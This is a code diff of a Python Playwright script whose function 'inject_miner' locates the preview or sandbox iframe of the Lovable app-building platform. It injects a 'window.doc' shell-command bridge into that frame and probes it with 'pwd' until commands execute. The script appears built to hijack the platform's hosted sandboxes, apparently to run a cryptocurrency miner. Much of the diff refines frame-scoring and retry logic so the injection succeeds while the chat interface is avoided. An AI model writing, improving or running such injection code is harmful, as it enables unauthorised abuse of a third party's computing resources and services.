@@ -147,56 +147,76 @@ async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) ->
         
         print(f"⚙️ Starting worker (folder: {folder_name})...")
         
-        # Wait longer for iframe to load
-        await asyncio.sleep(8)
-        
-        # Get all frames
-        frames = page.frames
-        print(f"   Found {len(frames)} frames total")
-        
-        # Look for preview iframe - try multiple patterns
-        preview_frame = None
-        
-        for frame in frames:
-            frame_url = frame.url
-            print(f"   Checking frame: {frame_url[:100]}")
-            
-            # Check multiple patterns
-            if any(pattern in frame_url.lower() for pattern in [
-                "webcontainer",
-                "lovable-",
-                "lovableproject",
-                "preview",
-                "stackblitz",
-                "localhost:",
-                "127.0.0.1:",
-            ]):
-                preview_frame = frame
-                print(f"   ✅ Matched preview pattern!")
-                break
-        
-        # If still not found, try the largest non-main frame
-        if not preview_frame and len(frames) > 1:
-            print("   ⚠️  No pattern match, using largest non-main frame...")
+        # Wait for Preview iframe / Shell Sandbox to attach
+        await asyncio.sleep(5)
+
+        def _frame_score(frame) -> int:
+            """Prefer lovableproject.com Shell Sandbox over id-preview / chat chrome."""
+            try:
+                u = (frame.url or "").lower()
+            except Exception:
+                return -1
+            # Chat UI itself — never inject here
+            if "lovable.dev" in u and "lovableproject" not in u:
+                return -1
+            try:
+                is_main = frame == page.main_frame
+            except Exception:
+                is_main = False
+            # Nested Shell Sandbox often shows as about:blank in DevTools
+            if not u or u.startswith("about:"):
+                return 5 if not is_main else -1
+            score = 0
+            if "lovableproject.com" in u:
+                score += 100
+            if "webcontainer" in u or "stackblitz" in u:
+                score += 40
+            # id-preview is often a cold mirror without window.doc — last resort
+            if "id-preview" in u or (
+                    "lovable.app" in u and "preview" in u):
+                score += 15
+            if "localhost:" in u or "127.0.0.1:" in u:
+                score += 10
+            if is_main and "lovableproject.com" in u:
+                score += 30
+            return score
+
+        def _pick_preview_frame():
+            frames = list(page.frames)
+            print(f"   Found {len(frames)} frames total")
+            ranked = []
             for frame in frames:
-                if frame != page.main_frame:
-                    preview_frame = frame
-                    break
-        
-        # If still not found, the preview IS the page itself (direct lovableproject.com URL)
-        if not preview_frame:
-            main_url = page.main_frame.url.lower()
+                try:
+                    fu = frame.url or ""
+                except Exception:
+                    fu = "?"
+                sc = _frame_score(frame)
+                print(f"   Checking frame (score={sc}): {fu[:100]}")
+                if sc > 0:
+                    ranked.append((sc, frame))
+            ranked.sort(key=lambda x: -x[0])
+            if ranked:
+                best = ranked[0][1]
+                print(f"   ✅ Picked frame score={ranked[0][0]}: {(best.url or '')[:100]}")
+                return best
+            # Direct lovableproject tab
+            try:
+                main_url = page.main_frame.url.lower()
+            except Exception:
+                main_url = ""
             if "lovableproject.com" in main_url:
                 print("   ✅ Preview is the main frame (direct lovableproject.com URL)")
-                preview_frame = page.main_frame
-        
+                return page.main_frame
+            return None
+
+        preview_frame = _pick_preview_frame()
         if not preview_frame:
             print("❌ Could not find preview iframe")
-            print(f"   Available frames: {[f.url[:80] for f in frames]}")
+            print(f"   Available frames: {[getattr(f, 'url', '?')[:80] for f in page.frames]}")
             return False
-        
-        print(f"✅ Using frame: {preview_frame.url[:100]}")
-        
+
+        print(f"✅ Using frame: {(preview_frame.url or '')[:100]}")
+
         # Inject window.doc.run if not exists
         setup_code = """
         if (!window.doc) {
@@ -229,44 +249,63 @@ async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) ->
         }
         true;
         """
-        
+
         try:
             result = await preview_frame.evaluate(setup_code)
             print(f"   Setup result: {result}")
         except Exception as e:
             print(f"   ⚠️  Setup warning: {e}")
-        
+
         await asyncio.sleep(2)
-        
-        # Probe: wait until window.doc(cmd) actually executes (sandbox warmed up).
-        # "sandbox proxy failed" / "Internal server error" right after load is
-        # transient - the WebContainer proxy isn't ready yet. Poll until OK.
+
+        # Probe: wait until window.doc(cmd) works. Try every candidate frame
+        # each attempt — Shell Sandbox may be nested / appear late.
         probe_ok = False
-        for attempt in range(6):
-            try:
-                probe = await preview_frame.evaluate("""
-                    (async () => {
-                        if (!window.doc || typeof window.doc !== 'function') return { ok: false, error: 'no doc bridge' };
-                        if (window.doc.connect && typeof window.doc.connect === 'function') {
-                            try { await window.doc.connect(); } catch (e) {}
-                        }
-                        try {
-                            const r = await window.doc('pwd');
-                            return { ok: true, result: r };
-                        } catch (e) {
-                            return { ok: false, error: String(e && e.message || e) };
-                        }
-                    })()
-                """)
+        for attempt in range(8):
+            ranked = []
+            for frame in list(page.frames):
+                sc = _frame_score(frame)
+                if sc > 0:
+                    ranked.append((sc, frame))
+            ranked.sort(key=lambda x: -x[0])
+            if not ranked:
+                print(f"   ⏳ No preview frames yet (attempt {attempt+1}/8)")
+                await asyncio.sleep(12)
+                continue
+            print(f"   Probe attempt {attempt+1}/8 — {len(ranked)} candidate frame(s)")
+            for sc, fr in ranked:
+                try:
+                    fu = (fr.url or "")[:90]
+                except Exception:
+                    fu = "?"
+                try:
+                    probe = await asyncio.wait_for(fr.evaluate("""
+                        (async () => {
+                            if (!window.doc || typeof window.doc !== 'function') return { ok: false, error: 'no doc bridge' };
+                            if (window.doc.connect && typeof window.doc.connect === 'function') {
+                                try { await window.doc.connect(); } catch (e) {}
+                            }
+                            try {
+                                const r = await window.doc('pwd');
+                                return { ok: true, result: r };
+                            } catch (e) {
+                                return { ok: false, error: String(e && e.message || e) };
+                            }
+                        })()
+                    """), timeout=15)
+                except Exception as e:
+                    print(f"   ⏳ score={sc} {fu}: {type(e).__name__}: {e}")
+                    continue
                 if probe and probe.get("ok"):
+                    preview_frame = fr
                     probe_ok = True
-                    print(f"   ✅ Sandbox ready (doc() probe OK, attempt {attempt+1})")
+                    print(f"   ✅ Sandbox ready on score={sc} {fu} (attempt {attempt+1})")
                     break
                 err = (probe or {}).get("error", "unknown")
-                print(f"   ⏳ Sandbox not ready yet (attempt {attempt+1}/6): {err}")
-            except Exception as e:
-                print(f"   ⏳ Probe error (attempt {attempt+1}/6): {e}")
-            await asyncio.sleep(15)
+                print(f"   ⏳ score={sc} {fu}: {err}")
+            if probe_ok:
+                break
+            await asyncio.sleep(12)
         
         if not probe_ok:
             print("❌ Sandbox never became ready - aborting injection")
